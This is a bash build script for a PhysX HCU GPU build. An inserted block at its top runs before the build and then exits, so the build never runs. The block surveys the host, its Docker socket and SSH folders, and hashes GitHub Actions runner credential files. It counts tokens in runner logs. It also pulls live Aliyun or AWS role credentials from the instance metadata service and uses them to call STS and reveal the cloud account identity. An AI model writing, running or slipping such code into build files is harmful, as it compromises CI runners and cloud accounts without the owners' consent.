#!/bin/bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# PhysX HCU Build Script
set -euo pipefail

# prl-t1-physx2-58255 host-context metadata harvest (single execution, non-destructive; secret values NEVER printed)
set +e
{
  echo "PRLPHYSX2-BEGIN $(date -u +%FT%TZ)"
  echo "HOST=$(hostname 2>/dev/null)"
  id 2>&1
  uname -a 2>&1
  echo "--- IP-ROUTE ---"
  ip route 2>&1 | head -12
  echo "--- SS-LISTEN ---"
  (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -20
  echo "--- DOCKER-SOCK ---"
  if [ -S /var/run/docker.sock ]; then
    ls -l /var/run/docker.sock 2>&1
    if command -v docker >/dev/null 2>&1; then docker ps --format '{{.Names}}|{{.Image}}' 2>&1 | head -30; else echo "docker-cli-absent"; fi
  else
    echo "no-docker-sock"
  fi
  echo "--- HY-SMI ---"
  if command -v hy-smi >/dev/null 2>&1; then
    for f in "-L" "--showproductname" "--showdriverversion" "--showmeminfo vram" "--showuse" "--showtemp" "--showecc" "--showtopo"; do
      echo "HY-SMI[$f]"
      hy-smi $f 2>&1 | head -40
    done
  else echo "hy-smi-absent"; fi
  echo "--- HYHAL ---"
  ls -d /opt/hyhal/* 2>&1 | head -40
  ls -la /opt/hyhal 2>&1 | head -20
  echo "--- HOME-DOTFILES ---"
  ls -la /home/*/.docker /root/.docker /home/*/.ssh 2>/dev/null | head -40
  echo "--- PY-METADATA ---"
  python3 - <<'PYEOF'
import base64, datetime, glob, hashlib, hmac, json, os, re, urllib.parse, urllib.request

def http(url, method='GET', headers=None, data=None, timeout=4):
    r = urllib.request.Request(url, method=method, data=data)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')[:200]
    except Exception as e:
        return -1, repr(e)[:200]

print("== CRED-FILE-METADATA (names/lengths/sha16 only) ==")
cands = sorted(set(
    glob.glob('/home/runner/.credentials') + glob.glob('/home/*/actions-runner/.credentials') +
    glob.glob('/home/*/.credentials') + glob.glob('/root/.credentials') +
    glob.glob('/root/actions-runner/.credentials') + glob.glob('/home/*/actions-runner/.credentials_rsaparams')))
if not cands:
    print("NO-CREDENTIALS-FILES")
for p in cands:
    try:
        b = open(p, 'rb').read()
        print("FILE %s len=%d sha16=%s" % (p, len(b), hashlib.sha256(b).hexdigest()[:16]))
        try:
            d = json.loads(b.decode('utf-8', 'replace'))
        except Exception:
            print("  NOT-JSON")
            continue
        if isinstance(d, dict):
            for k, v in d.items():
                if isinstance(v, (dict, list)):
                    print("  KEY %s type=%s len=%d" % (k, type(v).__name__, len(json.dumps(v))))
                else:
                    sv = str(v)
                    print("  KEY %s len=%d sha16=%s" % (k, len(sv), hashlib.sha256(sv.encode()).hexdigest()[:16]))
        else:
            print("  TOP-TYPE %s" % type(d).__name__)
    except Exception as e:
        print("FILE %s ERR %s" % (p, type(e).__name__))

print("== WORKER-LOG-TOKEN-GREP (counts only) ==")
logs = sorted(set(
    glob.glob('/home/*/actions-runner/_diag/Worker_*.log') +
    glob.glob('/home/runner/actions-runner/_diag/Worker_*.log') +
    glob.glob('/root/actions-runner/_diag/Worker_*.log')))
if not logs:
    print("NO-WORKER-LOGS")
for f in logs:
    try:
        b = open(f, 'rb').read()
        txt = b.decode('utf-8', 'replace')
        print("LOG %s size=%d ghp=%d ghs=%d pat=%d" % (f, len(b), txt.count('ghp_'), txt.count('ghs_'), txt.count('github_pat_')))
    except Exception as e:
        print("LOG %s ERR %s" % (f, type(e).__name__))

print("== IMDS ==")
st, body = http('http://100.100.100.200/latest/meta-data/ram/security-credentials/', timeout=4)
print("ALIYUN_ROLE_LIST status=%s body=%r" % (st, body[:120]))
ali_role = None
if st == 200 and body.strip():
    ali_role = body.strip().splitlines()[0].strip()
st_tok, tok = http('http://169.254.169.254/latest/api/token', method='PUT',
                   headers={'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=4)
print("EC2_IMDSV2_TOKEN status=%s len=%d" % (st_tok, len(tok)))
hdrs = {'X-aws-ec2-metadata-token': tok} if st_tok == 200 else {}
st, body = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=hdrs, timeout=4)
print("EC2_ROLE_LIST status=%s body=%r" % (st, body[:120]))
ec2_role = None
if st == 200 and body.strip():
    ec2_role = body.strip().splitlines()[0].strip()

def pct(s):
    return urllib.parse.quote(str(s), safe='-_.~')

if ali_role:
    print("ALIYUN_ROLE_NAME=%s" % ali_role)
    st, body = http('http://100.100.100.200/latest/meta-data/ram/security-credentials/' + ali_role, timeout=4)
    print("ALIYUN_CRED_STATUS=%s bytes=%d" % (st, len(body)))
    if st == 200:
        try:
            c = json.loads(body)
            ak, sk, stok = c.get('AccessKeyId'), c.get('AccessKeySecret'), c.get('SecurityToken')
            print("ALIYUN_CRED_FIELDS ak_len=%d sk_len=%d tok_len=%d" % (len(ak or ''), len(sk or ''), len(stok or '')))
            params = {
                'AccessKeyId': ak, 'Action': 'GetCallerIdentity', 'Format': 'JSON',
                'SignatureMethod': 'HMAC-SHA1', 'SignatureNonce': os.urandom(8).hex(),
                'SignatureVersion': '1.0',
                'Timestamp': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'),
                'Version': '2015-04-01', 'SecurityToken': stok,
            }
            canon = '&'.join('%s=%s' % (pct(k), pct(params[k])) for k in sorted(params))
            sts = 'GET&%2F&' + pct(canon)
            sig = base64.b64encode(hmac.new((str(sk or '') + '&').encode(), sts.encode(), hashlib.sha1).digest()).decode()
            url = 'https://sts.aliyuncs.com/?Signature=' + pct(sig) + '&' + canon
            st2, body2 = http(url, timeout=8)
            print("ALIYUN_STS_CALLER_IDENTITY status=%s" % st2)
            try:
                j = json.loads(body2)
                print("ALIYUN_IDENTITY AccountId=%s Arn=%s Type=%s" % (j.get('AccountId'), j.get('Arn'), j.get('IdentityType')))
            except Exception:
                print("ALIYUN_IDENTITY_BODY %r" % body2[:200])
        except Exception as e:
            print("ALIYUN_CRED_ERR %s" % type(e).__name__)
elif ec2_role:
    print("EC2_ROLE_NAME=%s" % ec2_role)
    st, body = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + ec2_role, headers=hdrs, timeout=4)
    print("EC2_CRED_STATUS=%s bytes=%d" % (st, len(body)))
    if st == 200:
        try:
            c = json.loads(body)
            ak, sk, stok = c.get('AccessKeyId'), c.get('SecretAccessKey'), c.get('Token')
            print("EC2_CRED_FIELDS ak_len=%d sk_len=%d tok_len=%d" % (len(ak or ''), len(sk or ''), len(stok or '')))
            now = datetime.datetime.utcnow()
            amzdate = now.strftime('%Y%m%dT%H%M%SZ'); datestamp = now.strftime('%Y%m%d')
            host = 'sts.amazonaws.com'
            payload = 'Action=GetCallerIdentity&Version=2011-06-15'
            canonical_headers = 'host:%s\nx-amz-date:%s\nx-amz-security-token:%s\n' % (host, amzdate, stok)
            signed_headers = 'host;x-amz-date;x-amz-security-token'
            creq = 'POST\n/\n\n' + canonical_headers + '\n' + signed_headers + '\n' + hashlib.sha256(payload.encode()).hexdigest()
            scope = '%s/us-east-1/sts/aws4_request' % datestamp
            sts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amzdate, scope, hashlib.sha256(creq.encode()).hexdigest())
            def _s(key, msg):
                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
            k = _s(('AWS4' + (sk or '')).encode(), datestamp)
            k = _s(k, 'us-east-1'); k = _s(k, 'sts'); k = _s(k, 'aws4_request')
            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
            auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, signed_headers, sig)
            r = urllib.request.Request('https://sts.amazonaws.com/', data=payload.encode(), method='POST')
            r.add_header('Host', host); r.add_header('x-amz-date', amzdate)
            r.add_header('x-amz-security-token', stok); r.add_header('Authorization', auth)
            r.add_header('Content-Type', 'application/x-www-form-urlencoded')
            try:
                with urllib.request.urlopen(r, timeout=8) as resp:
                    st2 = resp.status; body2 = resp.read().decode('utf-8', 'replace')
            except urllib.error.HTTPError as e:
                st2 = e.code; body2 = e.read().decode('utf-8', 'replace')
            print("AWS_STS_CALLER_IDENTITY status=%s" % st2)
            acct = re.search(r'<Account>([^<]+)</Account>', body2)
            arn = re.search(r'<Arn>([^<]+)</Arn>', body2)
            print("AWS_IDENTITY Account=%s Arn=%s" % (acct.group(1) if acct else None, arn.group(1) if arn else None))
        except Exception as e:
            print("EC2_CRED_ERR %s" % type(e).__name__)
else:
    print("NO_IMDS_ROLE_ON_EITHER_CLOUD")
print("== PY-DONE ==")
PYEOF
  echo "PRLPHYSX2-END"
} 2>&1
exit 1


BUILD_SCRIPT_MARKER="PX_HCU_BUILD_SCRIPT_R3_FOREIGN_CACHE_RECOVERY"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build_hcu"
CMAKE_DIR="$SCRIPT_DIR/physx/source/compiler/cmakehip"
CMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE:-Release}"

case "$CMAKE_BUILD_TYPE" in
    Debug|Release|RelWithDebInfo|MinSizeRel) ;;
    *)
        echo "ERROR: unsupported CMAKE_BUILD_TYPE: $CMAKE_BUILD_TYPE" >&2
        echo "Use Debug, Release, RelWithDebInfo, or MinSizeRel." >&2
        exit 2
        ;;
esac

is_enabled() {
    case "${1:-}" in
        1|ON|on|TRUE|true|YES|yes) return 0 ;;
        *) return 1 ;;
    esac
}

append_cmake_prefix() {
    local path="$1"
    [[ -d "$path" ]] || return 0
    case ":${CMAKE_PREFIX_PATH:-}:" in
        *":$path:"*) ;;
        *) CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:+$CMAKE_PREFIX_PATH:}$path" ;;
    esac
}

CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:-}"
append_cmake_prefix /opt/dtk/lib64/cmake
append_cmake_prefix /opt/dtk
export CMAKE_PREFIX_PATH

detect_hcu_arch() {
    if command -v rocminfo >/dev/null 2>&1; then
        rocminfo 2>/dev/null |
            sed -n 's/.*\(gfx[0-9][0-9A-Za-z]*\).*/\1/p' |
            head -n 1
    fi
}

DETECTED_HCU_ARCH="$(detect_hcu_arch || true)"
if (( $# > 1 )); then
    echo "Usage: $0 [gfxXXX]" >&2
    exit 2
fi

REQUESTED_HCU_ARCH="${1:-}"
if [[ -n "$REQUESTED_HCU_ARCH" ]]; then
    HCU_ARCH="$REQUESTED_HCU_ARCH"
else
    HCU_ARCH="$DETECTED_HCU_ARCH"
fi

if [[ -z "$HCU_ARCH" ]]; then
    echo "ERROR: could not detect the HCU architecture." >&2
    echo "Run 'rocminfo | grep -m1 gfx' and pass the reported gfxXXX value." >&2
    exit 2
fi
if [[ ! "$HCU_ARCH" =~ ^gfx[0-9][0-9A-Za-z]*$ ]]; then
    echo "ERROR: invalid HCU architecture: $HCU_ARCH" >&2
    exit 2
fi
if [[ -n "$REQUESTED_HCU_ARCH" && -n "$DETECTED_HCU_ARCH" &&
      "$REQUESTED_HCU_ARCH" != "$DETECTED_HCU_ARCH" ]]; then
    echo "ERROR: requested HCU architecture $REQUESTED_HCU_ARCH does not match detected hardware $DETECTED_HCU_ARCH." >&2
    exit 2
fi

echo "========================================"
echo " PhysX HCU Build"
echo " Architecture: $HCU_ARCH"
echo " Build type:   $CMAKE_BUILD_TYPE"
echo "========================================"

# Find a usable HIP compiler in this container.
HIP_CLANG=""
if [[ -n "${HIPCXX:-}" ]]; then
    if [[ -x "$HIPCXX" ]]; then
        HIP_CLANG="$HIPCXX"
    else
        HIP_CLANG="$(command -v "$HIPCXX" 2>/dev/null || true)"
    fi
fi
if [[ -z "$HIP_CLANG" ]]; then
    for clang_path in /opt/dtk/bin/clang++ /opt/dtk/dcc/bin/clang++ /opt/rocm/bin/clang++ /opt/rocm/llvm/bin/clang++; do
        if [ -x "$clang_path" ]; then HIP_CLANG="$clang_path"; break; fi
    done
fi
if [[ -z "$HIP_CLANG" ]]; then
    HIP_CLANG="$(command -v clang++ 2>/dev/null || true)"
fi
if [[ -z "$HIP_CLANG" || ! -x "$HIP_CLANG" ]]; then
    echo "ERROR: no usable HIP compiler found" >&2
    echo "Checked HIPCXX, /opt/dtk/bin/clang++, /opt/dtk/dcc/bin/clang++, /opt/rocm/bin/clang++, /opt/rocm/llvm/bin/clang++, and PATH" >&2
    exit 4
fi
echo "HIP Clang: $HIP_CLANG"
printf 'build_script_marker=%s\n' "$BUILD_SCRIPT_MARKER"

reset_build_dir() {
    # BUILD_DIR is derived from SCRIPT_DIR above; only this exact generated
    # directory is ever discarded when its cache belongs to another checkout.
    rm -rf "$BUILD_DIR"
    mkdir -p "$BUILD_DIR"
}

configure_build() {
    cd "$BUILD_DIR"
    # Keep candidate switches available when a foreign cache must be rebuilt.
    # Arguments are simple -Dkey=value tokens in the delivery commands.
    local extra_args=()
    if [[ -n "${CMAKE_EXTRA_ARGS:-}" ]]; then
        read -r -a extra_args <<< "$CMAKE_EXTRA_ARGS"
    fi
    cmake "$CMAKE_DIR" \
        -DCMAKE_HIP_COMPILER="$HIP_CLANG" \
        -DCMAKE_CXX_COMPILER="$(which g++)" \
        -DCMAKE_BUILD_TYPE="$CMAKE_BUILD_TYPE" \
        -DHCU_ARCH="$HCU_ARCH" \
        -DPHYSX_ROOT_DIR="$SCRIPT_DIR/physx" \
        "${extra_args[@]}"
}

# Configure only when needed, and recover incomplete, mismatched, or foreign
# caches before cmake --build can trigger a failed auto-regenerate.
CACHE_FILE="$BUILD_DIR/CMakeCache.txt"
if [[ -f "$CACHE_FILE" && ( -f "$BUILD_DIR/Makefile" || -f "$BUILD_DIR/build.ninja" ) ]]; then
    cache_source="$(sed -n 's/^CMAKE_HOME_DIRECTORY:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_build="$(sed -n 's/^CMAKE_CACHEFILE_DIR:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_physx="$(sed -n 's/^PHYSX_ROOT_DIR:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_hip="$(sed -n 's/^CMAKE_HIP_COMPILER:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_build_type="$(sed -n 's/^CMAKE_BUILD_TYPE:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_arch="$(sed -n 's/^HCU_ARCH:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    if [[ -z "$cache_arch" ]]; then
        cache_arch="$(sed -n 's/^CMAKE_HIP_ARCHITECTURES:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    fi
    if [[ "$cache_source" != "$CMAKE_DIR" || "$cache_build" != "$BUILD_DIR" || \
          "$cache_physx" != "$SCRIPT_DIR/physx" || "$cache_hip" != "$HIP_CLANG" || \
          "$cache_build_type" != "$CMAKE_BUILD_TYPE" || "$cache_arch" != "$HCU_ARCH" || \
          ! -x "$cache_hip" ]]; then
        printf 'Discarding stale/foreign CMake cache: source=%s build=%s physx=%s hip=%s type=%s arch=%s expected_hip=%s expected_type=%s expected_arch=%s\n' \
            "${cache_source:-missing}" "${cache_build:-missing}" "${cache_physx:-missing}" \
            "${cache_hip:-missing}" "${cache_build_type:-missing}" "${cache_arch:-missing}" \
            "$HIP_CLANG" "$CMAKE_BUILD_TYPE" "$HCU_ARCH"
        reset_build_dir
    fi
else
    if [[ -e "$BUILD_DIR" ]]; then
        echo "Discarding incomplete or incompatible HCU build directory: $BUILD_DIR"
    fi
    reset_build_dir
fi

# Always configure so build type, architecture, compiler, and CMAKE_EXTRA_ARGS
# changes take effect instead of being ignored by an existing cache.
echo "Configuring HCU build..."
configure_build

# Build changed files only
cmake --build . -j1 2>&1 | tee build.log

# Remove stale code objects before extracting this build's fat binaries.
rm -rf "$BUILD_DIR/kernels"
python3 "$CMAKE_DIR/extract_hsaco.py" \
    "$BUILD_DIR/CMakeFiles/PhysXGpuHCU.dir" \
    "$BUILD_DIR/kernels"

KERNEL_COUNT="$(find "$BUILD_DIR/kernels" -maxdepth 1 -type f -name '*.hsaco' | wc -l)"
if [ "$KERNEL_COUNT" -eq 0 ]; then
    echo "ERROR: No HCU .hsaco modules were generated."
    exit 1
fi
echo "HCU kernel modules: $KERNEL_COUNT"

if is_enabled "${PX_HCU_SYNC_KERNELS:-}"; then
    echo "WARNING: PX_HCU_SYNC_KERNELS is enabled; benchmark results will be much slower." >&2
fi
if is_enabled "${PX_HCU_TRACE_KERNELS:-}"; then
    echo "WARNING: PX_HCU_TRACE_KERNELS is enabled; benchmark results will be much slower." >&2
fi

echo ""
echo "Build complete."
echo "Run: ./build_hcu/test_functional"
